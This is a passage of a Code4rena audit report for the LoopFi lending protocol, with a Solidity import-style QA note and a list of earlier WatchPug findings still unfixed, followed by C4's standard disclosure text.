Multiple instances in scope; for example, see [here](https://github.com/code-423n4/2024-06-badger/blob/9173558ee1ac8a78a7ae0a39b97b50ff0dd9e0f8/ebtc-protocol/packages/contracts/contracts/LeverageMacroBase.sol#L4-L12).

```solidity
import './Interfaces/IBorrowerOperations.sol';
import './Interfaces/IERC3156FlashLender.sol';
import './Interfaces/IEBTCToken.sol';
import './Interfaces/ICdpManager.sol';
import './Interfaces/ISortedCdps.sol';
import './Interfaces/IPriceFeed.sol';
import './Dependencies/ICollateralToken.sol';
import { ICdpManagerData } from './Interfaces/ICdpManagerData.sol';
import './Dependencies/SafeERC20.sol';
```

Evidently, the imports being done is not name specific, but this is not the best implementation cause this could lead to polluting the symbol namespace.

### Impact

QA, albeit, this could lead to the potential pollution of the symbol namespace and a slower compilation speed.

### Recommended Mitigation Steps

Consider using import declarations of the form `import {<identifier_name>} from "some/file.sol"` which avoids polluting the symbol namespace making flattened files smaller, and speeds up compilation (but does not save any gas).

## Table of Contents for WatchPug's `C/H/M` Findings

| Issue ID | Description |
| ---------- | ----------- |
| [NC-01] | CC `WP-H4` from the WatchPug first report |
| [NC-02] | CC `WP-H7` from the WatchPug first report |
| [NC-03] | CC `WP-M10` from the WatchPug first report |
| [NC-04] | CC `WP-H3` from the WatchPug second report |
| [NC-05] | CC `WP-M5` from the WatchPug second report |
| [NC-06] | CC `Re: [WP-C2]` from the WatchPug third report |
| [NC-07] | CC `WP-M1` from the WatchPug fourth report |
| [NC-08] | CC `WP-M1` from the WatchPug fifth report |
| [NC-09] | CC `WP-M2` from the WatchPug fifth report |

### Links to CC'd audits reports

- [Report #1](https://notes.watchpug.com/p/18ea3089e2esgBHp)
- [Report #2](https://notes.watchpug.com/p/1909aa8a565HVvGe)
- [Report #3](https://notes.watchpug.com/p/190becc04cemgrXz)
- [Report #4](https://notes.watchpug.com/p/190c8fbf44ek5zZ4)
- [Report #5](https://notes.watchpug.com/p/190dd9d39acrEJAv)

## [NC-01] CC `WP-H4 `from the WatchPug first report

There is still no definite code for interest accounting and the share price math used in PoolV3 deposit and withdrawal operations is always `1.0`, not taking into account.

## [NC-02] CC `WP-H7` from the WatchPug first report

The issue `WP-H7` still seems unfixed because the contract continues to use the `calcDecrease` function for profit calculations in liquidation scenarios, including cases of bad debt. This function assumes all debt can be repaid, which **may not be true when liquidating underwater positions**. The contract still lacks a separate mechanism for accurately calculating losses in bad debt situations, leading to incorrect profit or loss calculations during liquidations.

## [NC-03] CC `WP-M10 `from the WatchPug first report

When liquidating an insolvent position the `loss` parameter is still not attached to the query for [`pool.repayCreditAccount()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L563), which causes the protocol to undermine the losses it gets.

## [NC-04] CC `WP-H3` from the WatchPug second report

The [current implementation](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L607) still lacks taking into account any accumulated penalty when calculating the loss, leaving the window still open.

## [NC-05] CC `WP-M5` from the WatchPug second report

There is [still no approval mechanism](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/Flashlender.sol#L105) for when sending back the tokens to the flashlender, which could bubble up a revert.

## [NC-06] CC `Re: WP-C2` from the WatchPug third report

Neither of the suggested fixes have been applied, since the `msg.sender` can still be a different account rather than the receiver in [`Flashlender#flashloan()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/Flashlender.sol#L87-L110) and there is no initiator check in [`PositionAction#onFlashloan()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L378-L427).

## [NC-07] CC `WP-M1` from the WatchPug fourth report

BalancerOracle [still uses the legacy `totalSupply()` with updating the `currentPrice` ](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/oracle/BalancerOracle.sol#L114-L137) which would mean the wrong amount of supplied would be included in the calculations when pools with preminted BPT are integrated.

## [NC-08] CC `WP-M1` from the WatchPug fifth report

When [liquidating positions via `liquidatePosition()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L509) `discountedPrice` is still not being used when determining if a position is in bad debt status; which means that this functionality can still be used for bad debt positions instead of offloading it to only `liquidatePositionBadDebt()` can be used for bad debt positions.

## [NC-09] CC `WP-M2` from the WatchPug fifth report

No documentation was attached on this, the implementation was left as-is, I'm thinking on the assumption that the decimals would always be `18` but this should be explicitly stated/documented.

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
